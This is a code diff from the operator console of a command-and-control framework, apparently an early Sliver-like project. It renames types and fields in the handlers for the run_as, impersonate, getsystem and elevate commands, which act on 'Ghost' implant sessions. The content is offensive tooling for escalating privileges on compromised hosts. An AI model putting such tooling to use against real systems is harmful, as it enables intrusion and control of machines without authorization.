@@ -33,10 +33,10 @@ import (
 func registerPrivCommands() {
 	runAs := &Command{
 		Name: "run_as",
-		Args: []*CommandArg{
-			&CommandArg{Name: "proc", Type: "string"},
-			&CommandArg{Name: "user", Type: "string"},
-			&CommandArg{Name: "timeout", Type: "int"},
+		Args: []*Arg{
+			&Arg{Name: "proc", Type: "string"},
+			&Arg{Name: "user", Type: "string"},
+			&Arg{Name: "timeout", Type: "int"},
 		},
 		Handle: func(r *Request) error {
 			fmt.Println()
@@ -68,8 +68,8 @@ func registerPrivCommands() {
 
 	getsystem := &Command{
 		Name: "getsystem",
-		Args: []*CommandArg{
-			&CommandArg{Name: "proc", Type: "string"},
+		Args: []*Arg{
+			&Arg{Name: "proc", Type: "string"},
 		},
 		Handle: func(r *Request) error {
 			fmt.Println()
@@ -81,8 +81,8 @@ func registerPrivCommands() {
 
 	elevate := &Command{
 		Name: "elevate",
-		Args: []*CommandArg{
-			&CommandArg{Name: "proc", Type: "string"},
+		Args: []*Arg{
+			&Arg{Name: "proc", Type: "string"},
 		},
 		Handle: func(r *Request) error {
 			fmt.Println()
@@ -130,7 +130,7 @@ func runAs(args []string, ctx ShellContext, rpc RPCServer) {
 		fmt.Printf(Warn+"Error: %s\n", runAs.Err)
 		return
 	}
-	fmt.Printf(Success+"Sucessfully ran %s %s on %s\n", process, arguments, ctx.CurrentAgent.Name)
+	fmt.Printf(Success+"Sucessfully ran %s %s on %s\n", process, arguments, ctx.Ghost.Name)
 }
 
 func impersonate(args []string, ctx ShellContext, rpc RPCServer) {
@@ -142,7 +142,7 @@ func impersonate(args []string, ctx ShellContext, rpc RPCServer) {
 
 	data, _ := proto.Marshal(&ghostpb.ImpersonateReq{
 		Username: username,
-		GhostID:  ctx.CurrentAgent.ID,
+		GhostID:  ctx.Ghost.ID,
 	})
 
 	resp := <-rpc(&ghostpb.Envelope{
@@ -169,7 +169,7 @@ func impersonate(args []string, ctx ShellContext, rpc RPCServer) {
 func revToSelf(ctx ShellContext, rpc RPCServer) {
 
 	data, err := proto.Marshal(&ghostpb.RevToSelfReq{
-		GhostID: ctx.CurrentAgent.ID,
+		GhostID: ctx.Ghost.ID,
 	})
 	if err != nil {
 		fmt.Printf(Warn+"Error marshaling RevToSelfReq: %v\n", err)
@@ -210,7 +210,7 @@ func getsystem(args []string, ctx ShellContext, rpc RPCServer) {
 	ctrl := make(chan bool)
 	go spin.Until("Attempting to create a new Ghost implant session as 'NT AUTHORITY\\SYSTEM'...", ctrl)
 	data, _ := proto.Marshal(&clientpb.GetSystemReq{
-		GhostID:        ctx.CurrentAgent.ID,
+		GhostID:        ctx.Ghost.ID,
 		Config:         config,
 		HostingProcess: process,
 	})
@@ -241,7 +241,7 @@ func elevate(ctx ShellContext, rpc RPCServer) {
 
 	ctrl := make(chan bool)
 	go spin.Until("Starting a new Ghost implant session...", ctrl)
-	data, _ := proto.Marshal(&ghostpb.ElevateReq{GhostID: ctx.CurrentAgent.ID})
+	data, _ := proto.Marshal(&ghostpb.ElevateReq{GhostID: ctx.Ghost.ID})
 	resp := <-rpc(&ghostpb.Envelope{
 		Type: ghostpb.MsgElevate,
 		Data: data,
@@ -271,7 +271,7 @@ func runProcessAsUser(username, process, arguments string, ctx ShellContext, rpc
 		Username: username,
 		Process:  process,
 		Args:     arguments,
-		GhostID:  ctx.CurrentAgent.ID,
+		GhostID:  ctx.Ghost.ID,
 	})
 
 	resp := <-rpc(&ghostpb.Envelope{
@@ -292,7 +292,7 @@ func runProcessAsUser(username, process, arguments string, ctx ShellContext, rpc
 }
 
 func getActiveGhostConfig(ctx ShellContext) *clientpb.GhostConfig {
-	ghost := *ctx.CurrentAgent
+	ghost := *ctx.Ghost
 	c2s := []*clientpb.GhostC2{}
 	c2s = append(c2s, &clientpb.GhostC2{
 		URL:      ghost.ActiveC2,
